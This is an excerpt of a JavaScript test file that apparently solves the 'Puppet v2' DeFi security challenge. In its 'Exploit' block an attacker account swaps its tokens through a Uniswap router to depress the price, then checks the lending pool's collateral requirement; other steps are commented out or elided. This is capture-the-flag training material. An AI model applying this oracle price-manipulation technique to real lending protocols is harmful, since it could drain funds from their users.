...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const ATTACKER_ETH_BALANCE = await ethers.provider.getBalance(attacker.address);
        console.log(
            ethers.utils.formatEther(ATTACKER_ETH_BALANCE)
            );
        console.log(
        ...
        // this.token.balanceOf(this.uniswapExchange.address)
        // await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        // for(let i = 0; i < 10; i++){
        // await this.token.connect(attacker).transfer(this.uniswapExchange.address, ethers.utils.parseEther('10000'));
        // await this.uniswapExchange.sync();

        this.token.connect(attacker).approve(
            this.uniswapRouter.address,
            ATTACKER_INITIAL_TOKEN_BALANCE
        )
        this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [
                this.token.address,
        ...
        console.log("attacker token val: ", ethers.utils.formatEther(
            await this.token.balanceOf(attacker.address)
        ))

        console.log("attacker weth val: ", ethers.utils.formatEther(
        ...
        let collateralAmount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        ...
        //     ATTACKER_INITIAL_TOKEN_BALANCE
        // );
        // await this.uniswapRouter.connect(attacker).addLiquidity(
        //     this.token.address,
        //     this.weth.address,
        //     ethers.utils.parseEther('1'),                              // amountTokenDesired
        //     0,                                                          // amountTokenMin
        //     0,
        //     0,                                                          // amountETHMin
        //     attacker.address,                                           // to
